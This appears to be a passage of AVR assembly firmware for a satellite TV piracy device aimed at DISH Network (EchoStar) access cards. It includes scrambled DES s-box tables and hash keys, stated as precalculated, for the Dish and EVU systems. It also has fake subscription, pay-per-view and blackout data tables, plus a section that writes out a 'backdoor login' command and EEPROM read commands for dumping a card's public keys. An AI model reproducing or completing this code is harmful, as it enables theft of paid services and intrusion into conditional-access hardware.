; every	4th byte starting with byte 0 (bytes 0,	4, 8, ...), s-box 4 is stored
; in every 4th byte starting with byte 1 (bytes	1, 5, 9, ...).	In addition
; to this concatentaion, the e*	s-boxes	appear somewhat	scrambled in
; comparison to	"standard" DES s-boxes, but this is a simple bit-swap
; type scramble: All of	the bytes of the standard DES s-boxes are in the
; E* s-boxes, it's just that their positions are somewhat skewed.  This
; scrambling is	likely a side-effect of	the fact that the E* data is treated
; as bit-flopped: If the 6-bit "standard DES" lookup value's bits are
; numbered 654321, the corresponding E*	lookup value's bits are numbered
; 512346.  Additionally, the values in the s-boxes themselves are bit-flopped
; on a per-nibble (BASIS per-byte), so,	for example, a 7 in the	E* s-box
; will appear as an E (or a 14)	in a "standard" DES s-box.  Below the table
; are the s-boxes as they would	appear after being de-flopped and, in the
; case of the even-numbered s-boxes, reassembled.
;
; What the s-boxes are used for:
; In each round	of encryption or decryption,4  bytes of	the data being
; encrypted/decrypted are fed through a	function which expands them from
; 32 bits to 48	bits.  These 48	bits are used, in turn,	to look	up
; substitution (hence the "s" in "s-box") values which replace the original
; data in 4-bit	blocks.	 This provides a non-linear permutation	which will
; very quickly produce very random-looking output data.
;
;
; This data represents the "normalized" s-box data for the E* s-boxes.  If
; you compare this data	to "standard" DES s-boxes, you'll quickly see the
; pattern to how the two correlate...take four entries with binary lookup
; values of %00xxx0, %01xxx0, %10xxx0, and %11xxx0 from	the E* table and
; match	them to	entries	numbered %00xxx0, %00xxx1, %01xxx0, and	%01xxx1
; of the "standard" table.
;
;	  S-box	1
;	   14  4   3 15	  2 13	 5  3  13 14   6  9  11	 2   0	5   
;	    4  1  10 12	 15  6	 9 10	1  8  12  7   8	11   7	0   
;	    0 15  10  5	 14  4	 9 10	7  8  12  3  13	 1   3	6   
;	   15 12   6 11	  2  9	 5  0	4  2  11 14   1	 7   8 13   
; 
;	   S-box 2
;	   15  0   9  5	  6 10	12  9	8  7   2 12   3	13   5	2   
;	    1 14   7  8	 11  4	 0  3  14 11  13  6   4	 1  10 15   
;	    3 13  12 11	 15  3	 6  0	4 10   1  7   8	 4  11 14   
;	   13  8   0  6	  2 15	 9  5	7  1  10 12  14	 2   5	9   
;  
;	   S-box 3
;	   10 13   1 11	  6  8	11  5	9  4  12  2  15	 3   2 14   
;	    0  6  13  1	  3 15	 4 10  14  9   7 12   5	 0   8	7   
;	   13  1   2  4	  3  6	12 11	0 13   5 14   6	 8  15	2   
;	    7 10   8 15	  4  9	11  5	9  0  14  3  10	 7   1 12   
;  
;	   S-box 4
;	    7 10   1 15	  0 12	11  5  14  9   8  3   9	 7   4	8   
;	   13  6   2  1	  6 11	12  2	3  0   5 14  10	13  15	4   
;	   13  3   4  9	  6 10	 1 12  11  0   2  5   0	13  14	2   
;	    8 15   7  4	 15  1	10  7	5  6  12 11   3	 8   9 14   
; 
;	   S-box 5
;	    2  4   8 15	  7 10	13  6	4  1   3 12  11	 7  14	0   
;	   14 11   5  6	  4  1	 3 10	2 12  15  0  13	 2   8	5   
;	   12  2   5  9	 10 13	 0  3	1 11  15  5   6	 8   9 14   
;	   11  8   0 15	  7 14	 9  4  12  7  10  9   1	13   6	3   
;  
;	   S-box 6
;	   12  9   0  7	  9  2	14  1  10 15   3  4   6	12   5 11   
;	   10  4   6 11	  7  9	 0  6	4  2  13  1   9	15   3	8   
;	    1 14  13  0	  2  8	 7 13  15  5   4 10   8	 3  11	6   
;	   15  3   1 14	 12  5	11  0	2 12  14  7   5	10   8 13   
;  
;	   S-box 7
;	    4  1   3 10	 15 12	 5  0	2 11   9  6   8	 7   6	9   
;	   13  6  14  9	  4  1	 2 14  11 13   5  0   1	10   8	3   
;	   11  4  12 15	  0  3	10  5  14 13   7  8  13	14   1	2   
;	    0 11   3  5	  9  4	15  2	7  8  12 15  10	 7   6 12   
;  
;	   S-box 8
;	   13  7  10  0	  6  9	 5 15	8  4   3 10  11	14  12	5   
;	    1  2  12 15	 10  4	 0  3  13 14   6  9   7	 8   9	6   
;	    2 11   9  6	 15 12	 0  3	4  1  14 13   1	 2   7	8   
;	   15  1   5 12	  3 10	14  5	8  7  11  0   4	13   2 11   
;
; Above	each block of data, there is a header showing the s-box	to which
; the data below belongs.
;
S_Boxes:
;        21   41   61   81   21   41   61   81
   .DB 0xF7,0xE2,0x3C,0xBF,0x04,0x5B,0x9A,0xEC
   .DB 0x9B,0x87,0x06,0x59,0xAD,0xF4,0xE0,0x0A
   .DB 0x62,0x08,0x95,0x63,0x5F,0x36,0x49,0x95
   .DB 0x38,0xD1,0x73,0xAE,0x91,0xAD,0x8E,0xF0
   .DB 0x10,0x7F,0x55,0x1A,0xE7,0x92,0xF9,0x25
   .DB 0x4E,0x11,0xC3,0xCC,0x3B,0xC8,0x2C,0x56
   .DB 0xCF,0x93,0x66,0xDD,0xB4,0xE9,0x3A,0x70
   .DB 0xA2,0x24,0xAD,0x37,0x48,0x1E,0xD1,0xAB
   
;        23   43   63   83   23   43   63   83
   .DB 0x85,0xBB,0x88,0x4D,0x76,0x61,0x7D,0xDA
   .DB 0xE9,0x42,0xB3,0x94,0x1F,0x8C,0x04,0x67
   .DB 0xD0,0x66,0x4B,0xF8,0x2C,0xDF,0x12,0x35
   .DB 0x07,0x39,0xEE,0x03,0xCA,0x40,0xB1,0xCE
   .DB 0x7B,0xC8,0xF4,0x22,0xDC,0x06,0xA3,0x8D
   .DB 0xB0,0xAB,0x2A,0x77,0x66,0x71,0x5F,0xB4
   .DB 0x2E,0x55,0x11,0x8F,0x82,0xB9,0xCD,0x4A
   .DB 0x59,0xF0,0xD7,0xEC,0xF5,0x2E,0x68,0x13
   
 ;       25   45   65   85   25   45   65   85
   .DB 0xC4,0xB2,0x51,0x8F,0xBE,0xC5,0x2B,0x46
   .DB 0x32,0x28,0x6C,0x33,0xDD,0x9E,0xD7,0xF0
   .DB 0xF3,0x64,0xEA,0x59,0xC5,0x5B,0x90,0x2C
   .DB 0x68,0x8D,0x0F,0x0A,0x06,0x31,0x69,0xC7
   .DB 0x27,0xDD,0x2A,0xB6,0x52,0x08,0x4C,0x75
   .DB 0x84,0x43,0xBF,0x60,0xEB,0xA4,0x81,0x9A
   .DB 0x1D,0x01,0x90,0xEF,0x2E,0xB7,0xF9,0x12
   .DB 0xD3,0x7E,0xC5,0x99,0x78,0x4B,0x16,0x6C
   
;        27   47   67   87   27   47   67   87   
   .DB 0xB2,0x18,0xFC,0xF5,0x1F,0xF3,0xCA,0x80
   .DB 0x04,0xED,0x89,0xA6,0x61,0x2E,0x76,0x39
   .DB 0x4D,0xF2,0x33,0xCF,0xF0,0x8C,0xA5,0x5A
   .DB 0x97,0x5B,0xDE,0x71,0xAB,0xE7,0x08,0xA4
   .DB 0xEB,0xA6,0x47,0x19,0x82,0x68,0x34,0xE7
   .DB 0x5D,0x3B,0x7A,0xD0,0x38,0xD5,0xE1,0x0C
   .DB 0x70,0xCD,0xAC,0x2A,0x49,0x12,0x5F,0xB4
   .DB 0xAE,0x91,0x13,0x4F,0x95,0x7E,0xB6,0xD3 


;
;==============================================================================================
;  
;
; Misc info about data variables
;
;Enabler Type Info
;Code       Description    
;x0         No CAM
;x2 %0010   X-Sub Married
;x6 %0110   X-Sub Not Married / Virgin
;xA %1010   Subbed Married
;xE %1110   Subbed Not Married
;x = 8 for modified AVR1 board, 0 for blocker board
;
;x2 = %0010  X-sub
;x4 = %0100  Not Married
;x8 = %1000  Subbed
;
;
;System Info
;Sys ID  - Whose IRD (dish,evu,etc)is the software talking to
;Fake ID - Whose CAM is sw faking to be
;CAM ID  - Whose CAM is it really
;
;System      Sys ID  Fake/CAM ID    Hash Key
;Dish         01 01     00         "1E FF 75 45 4C FD 2D 93"
;EVU          09 01     08         "C6 73 B5 BB 7F 8C 93 02"
;MicroSpace   21 01     20          NA
;ViaDigital   41 01     40         "75 F9 89 22 75 E0 7F E1"
;Carribean    61 01     60          NA
;
;TimeZone Values
;E0=PST, E4=MST/PDT, E8=CST/MDT, F0=EDT/AST, F2=NST, F4=ADT, F6=NDT
;
;Blackout Info
;Option 1 = "FF FF FF 7F 7F 7F 7F 7F 7F 7F 7F 7F 7F 7F 7F"
;Option 2 = "FF FF FF B4 B4 B4 B4 B4 B4 B4 B4 B4 B4 B4 B4"
;Option 3 = "FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF"
;
;
;---------------------------------------------------------------------------------------------------
;
	.ESEG ;	EEPROM
;
;
; Married IRD info.  Includes such information as the married IRD's serial number,
;  subscriber's ZIP code (for sports blackouts), subscriber's time zone, IRD key, etc.  
;
;
eC21_01:	.db 30		; length = 30 bytes
eFSID1:		.db 0
		.db 1
		.db 0
		.db 1
eZip:		.db 0, 0, 0, 0
eTZ:		.db 0
		.db 0
eIRDrev:	.db 0, 0, 0, 0,	0, 0, 0, 0, 0, 0 ; ...
		.db 0, 0, 0, 0,	0, 0, 0, 0, 0, 0

;
; Cmd 21-02  Secondary programming provider information
;
eC21_02:	.db 4		; length = 4 bytes
eSID1:		.db 1, 1
		.db 0
		.db 0
;
; Cmnd 21-06
;
; Public service info.	Includes blackout information and public decryption keys for $03 commands 
;  (on ROM2 cards, anyway).  Note: Contains hidden info	(decrypt keys)
;
eC21_06:	.db 39		; length = 39 bytes
eFSID2:		.db 0
		.db 0
		.db 0
eCAMID1:	.db 0, 0, 0, 0		; ...
		.db 0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF
		.db 0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF


eSIDs:		.db 1
		.db 0
		.db 0
eCAMID2:	.db 0, 0, 0, 0
		.db 0xFF, 0xFF,	0xFF, 0xFF, 0xFF, 0xFF,	0xFF, 0xFF, 0xFF
		.db 0xFF, 0xFF,	0xFF, 0xFF, 0xFF, 0xFF,	0xFF, 0xFF
eBlkOut:	.db 0xFF, 0xFF,	0xFF, 0x7F, 0x7F, 0x7F,	0x7F, 0x7F
		.db 0x7F, 0x7F,	0x7F, 0x7F, 0x7F, 0x7F,	0x7F

;
; Cmnd 21-08
;
; Valid	channel	services (enables channels in the program guide, allows	the IRD	to 
;  decide on its own if	a channel is subscribed, and if	not, to	display	the 
;  "this channel is not subscribed" dialog)
;
eC21_08:	.db 28		; data length
eSID2:		.db 1, 1
		.db 0, 0, 0, 0,	0, 0, 0, 0, 0, 0, 0, 0,	0x4C
		.db 0x21, 0x4C,	0x21, 0, 0, 0x7F, 0xFF,	0x80, 0, 0xFF, 0, 0xFF,	0

; Cmnd 21-0B
;
; Valid	PPV services (enables the IRD to decide	on its own whether or not to display 
; the "this PPV has not been purchased" dialog)

eC21_0B:	.db 34			; ...
					; data length
eSID3:		.db 1, 1		; ...
		.db 0x30,0x00,0x8E,0x39,0x01,0x00,0x99,0x99,0x00,0x00,0x7F,0xFF,0x00,0x00,0x00,0x7F
		.db 0xFF,0x80,0x00,0x00,0x00,0x00,0x7F,0xFF,0xFF,0xFF,0x00,0x01,0x40,0xFF,0x7F,0xFF


; Cmd 21 table,	each 2 bytes = (L:H) of	data to	return for Cmd21-xx request

eCmd21:		.dw 0xFFFF	; 21-00 - no such command
		.dw eC21_01	; 21-01
		.dw eC21_02	; 21-02
		.dw 0xFFFF	; 21-03
		.dw 0xFFFF	; 21-04
		.dw 0xFFFF	; 21-05
		.dw eC21_06	; 21-06
		.dw 0xFFFF	; 21-07
		.dw eC21_08	; 21-08
		.dw 0xFFFF	; 21-09
		.dw 0xFFFF	; 21-0A,10
		.dw eC21_0B	; 21-0B,11


eCMD14:		.db 0xF, 0x4C, 0x54, 0x6B	; Cmnd 14 header
eEnabler:	.db 0x80		; ...
eAuxKey0:	.db 0, 0, 0, 0,	0, 0, 0, 0 ; ...
eAuxKey1:	.db 0, 0, 0, 0,	0, 0, 0, 0 ; ...
ePassWrd:	.db 0xFF, 0xFF,	0xFF, 0xFF, 0xFF, 0xFF,	0xFF, 0xFF ; Init = no password
ePubKey0:	.db 0, 0, 0, 0,	0, 0, 0, 0
ePubKey1:	.db 0, 0, 0, 0,	0, 0, 0, 0
eBoxKey:	.db 0, 0, 0, 0,	0, 0, 0, 0
eCAMPub:	.db 0, 0, 0, 0,	0, 0, 0, 0
eCAMBox:	.db 0, 0, 0, 0,	0, 0, 0, 0
eHashKey:	.db 0, 0, 0, 0,	0, 0, 0, 0
eCAMsID:	.db 0
eCAMsKey:	.db 0x15


; *****************************************************************************************
; MCG307 START CHANGES #8
; *****************************************************************************************
; MCG306 Cmnd 0 signature values
;eCmd0_Sig1:	.db 0xF6,0x48,0x97,0x30,0x12,0x7B,0xBA,0xE6
;eCmd0_Sig2:	.db 0x6C,0x4D,0xAD,0xDE,0xD3,0x37,0x0D,0x5A
;eCmd0_Sig3:	.db 0xAB,0xA7,0x16,0xEA,0xE7,0xD1,0x1F,0xB2
; *****************************************************************************************
; MCG307 CHANGES END #8
; *****************************************************************************************


; *+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
; *h0rhay* CHANGES START [7/7]
;
; Remember you don't need to reserve space for the LRC since h0_talk takes care of everything.

; Get CAMID.  Plain old boring CMD $12 command.  Works on all CAMs.  Mostly useless.  But it works.

h0_getid:	.db 0x21,0x00,0x08,0xA0,0xCA,0x00,0x00,0x02,0x12,0x00,0x06


; Classic Backdoor Login command. (Too bad they're trying to take it away from us!)
; 0x21,0x00,0x25 { message } LRC

h0_login: .db 0x21,0x00,0x25,0xA0,0x20,0x00,0x00,0x20
          .db 0x8F,0xAB,0xC2,0x64,0x44,0x9A,0xFE,0x70
          .db 0x1D,0xE7,0x62,0xFA,0xB1,0x4C,0x31,0x06
h0_key:   .db 0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF
          .db 0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF

; This command sets up the EEP pointer to $E000 and reads 1 byte. (which we ignore)
; 0x21,0x00,0x07 { h0_rsetup } LRC=0xA3

h0_rsetup:	.db 0x21,0x00,0x07,0xA0,0xB0,0x94,0x00,0x00,0x00,0x01

; This command sets up the CAM EEP pointer to point to the Public Keys.
; Since the previous command initialized the pointer to $E000 we need only enter
; an offset to get to the key. $EA3D from ROM2 for example would have an
; offset of $0A3D and this would be loaded below (by the setup program) where
; the 0x11,0x22 is. ROM2=$EA3D, ROM3 is either $E508 or $E50F
;
; 0x21,0x00,0x07 { h0_read } LRC=0x00 (calculated by setup program)

h0_read:    .db 0x21,0x00,0x07,0xA0,0xB0,0x11,0x22,0x00,0x00,0x10

; Precalculated HASH key that gets moved to "eHashKey".  Also takes care of eCAMsID.

h0_hash0:	.db 0x1E,0xFF,0x75,0x45,0x4C,0xFD,0x2D,0x93,0x00		; Dish
h0_hash8:	.db 0xC6,0x73,0xB5,0xBB,0x7F,0x8C,0x93,0x02,0x08		; X

; Here is where we store the ATR from the CAM.  Reserve the max. of 32 bytes.
; This really isn't needed.  But fuck it. I'm leaving the code in.

h0_aaa:	.db 0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF
		.db 0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF
		.db 0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF
		.db 0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF

;
; *h0rhay* CHANGES  END  [7/7]
; *+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*

; ЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭ

; Segment type:	Pure data
.DSEG ;	RAM
	.org 0x60		; Starts after the register aread

sRAMstart:	.byte 15
sStack:		.byte 1


sLCDD:		.byte 1
sLCDP:		.byte 1


Stat1:		.byte 1
Stat2:		.byte 1
Stat3:		.byte 1


sC21_flag1:	.byte 1
sC21_flag2:	.byte 1


sSeqNum:	.byte 1


sFree78n48:	.byte 48


sMsgBuf:	.byte 1
sMB_1:		.byte 1
sMB_2:		.byte 1
sMB_3:		.byte 1
sMB_4:		.byte 1
sMB_5:		.byte 1
sMB_6:		.byte 1
sMB_7:		.byte 1
sMB_8:		.byte 1
sMB_9:		.byte 1
sMB_10:		.byte 1
sMB_11:		.byte 1
sMB_12:		.byte 1
		.byte 7
sMB_C03pkt1:	.byte 1
		.byte 1
sMB_C13cw1:	.byte 1
		.byte 5
sMB_C03pkt2:	.byte 1
		.byte 2
sMB_C13cw2:	.byte 1
		.byte 4
sMB_C03pkt3:	.byte 8
sMB_C03pkt4:	.byte 8
sMB_C03hash:	.byte 1	
		.byte 35
sKeyBuff0:	.byte 1
sKeyBuff1:	.byte 1
sKeyBuff2:	.byte 1
sKeyBuff3:	.byte 1
sKeyBuff4:	.byte 1
sKeyBuff5:	.byte 1
sKeyBuff6:	.byte 1
sKeyBuff7:	.byte 1


sCryPtL:	.byte 1
sCryPtH:	.byte 1


sFree10An55:	.byte 55


sSysID:		.byte 1
sKeyPtL:	.byte 1
sKeyPtH:	.byte 1


sEBoxKey:	.byte 9
sDKey0:		.byte 9
sDKey1:		.byte 9
		.byte 1
sDCAMbox:	.byte 9
		.byte 1
sECAMPub:	.byte 9
sFree173n9:	.byte 9


sTemp:		.byte 132


		.exit ;	start
